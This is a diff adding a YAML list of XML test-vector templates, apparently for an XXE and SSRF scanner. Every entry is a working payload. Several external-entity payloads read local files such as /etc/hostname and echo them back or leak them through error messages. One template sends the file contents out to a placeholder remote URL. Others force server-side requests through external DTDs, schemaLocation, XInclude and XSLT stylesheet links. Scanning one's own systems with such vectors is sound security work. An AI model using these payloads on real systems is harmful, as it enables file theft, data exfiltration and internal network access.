@@ -1,0 +1,90 @@
+# A list of test-vector templates. Allowed placeholders are:
+#   ${SYSPUB}
+#   ${PROTOCOLHANDLE}
+#   ${PUBLIC_URL_PLACEHOLDER}
+
+# are inline DTDs allowed?
+- |
+  <!DOCTYPE data [<!ELEMENT data (#ANY)>]>
+  <data>42</data>
+
+# probe for reflections (general external entity, direct feedback channel)
+- |
+  <!DOCTYPE data [
+    <!ENTITY foo "ae8771ea1df2425abf59482ac4ac0327">
+  ]>
+  <data>&foo;</data>
+
+- |
+  <!DOCTYPE data [
+    <!ENTITY % foo "<!ENTITY bar '6b4bc7667ee94fa3893b90e63b0a23b9'>">
+    %foo;
+  ]>
+  <data>&bar;</data>
+
+# include file content in direct feedback
+- |
+  <!DOCTYPE Response [<!ENTITY ext ${SYSPUB} "file:///sys/power/image_size" >]>
+  <Response>&ext;</Response>
+
+# SSRF using general external entities
+- |
+  <!DOCTYPE data [
+   <!ENTITY ext ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/xmlelement.xml" >
+  ]>
+  <data>&ext;</data>
+
+- |
+  <!DOCTYPE data [
+   <!ENTITY ext ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/xmlattribute.xml" >
+  ]>
+  <data attrib='&ext;'/>
+
+# probe whether external DTDs are resolved
+- |
+  <!DOCTYPE data ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/ext.dtd" >
+  <data>sometext</data>
+
+# probe for file access using combinations of parameter and general ext entities
+- |
+  <!DOCTYPE data [
+   <!ENTITY % remote ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/parameterEntity.dtd">
+   %remote;
+  ]>
+  <data>&ent;</data>
+
+# provoke error message and attempt to include file content
+- |
+  <!DOCTYPE data [
+   <!ENTITY % payload ${SYSPUB} "file:///etc/hostname">
+   <!ENTITY % param1 '<!ENTITY % external ${SYSPUB} "file:///nothere/%payload;">'>
+   %param1;
+   %external;
+  ]>
+  <data>&ext;</data>
+
+# file access using parameter entities (violates "internal subset" restriction for param ents)
+- |
+  <!DOCTYPE data [
+   <!ENTITY % payload ${SYSPUB} "file:///etc/hostname">
+   <!ENTITY % param1 '<!ENTITY % external ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/?payl=%payload;">'>
+   %param1;
+   %external;
+  <data>&ext;</data>
+
+# SSRF using schemaLocation
+- |
+  <ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ttt="http://example.com/attack" xsi:schemaLocation="${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/xmlSchema.xsd">42</ttt:data>
+
+# SSRF using xInclude
+- |
+  <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/xInclude.txt" parse="text"></xi:include></data>
+
+# SSRF using noNamespaceSchemaLocation
+- |
+  <data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}">42</data>
+
+# SSRF using XSLT href
+- |
+  <?xml-stylesheet href="${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}"?>
+  <data>42</data>
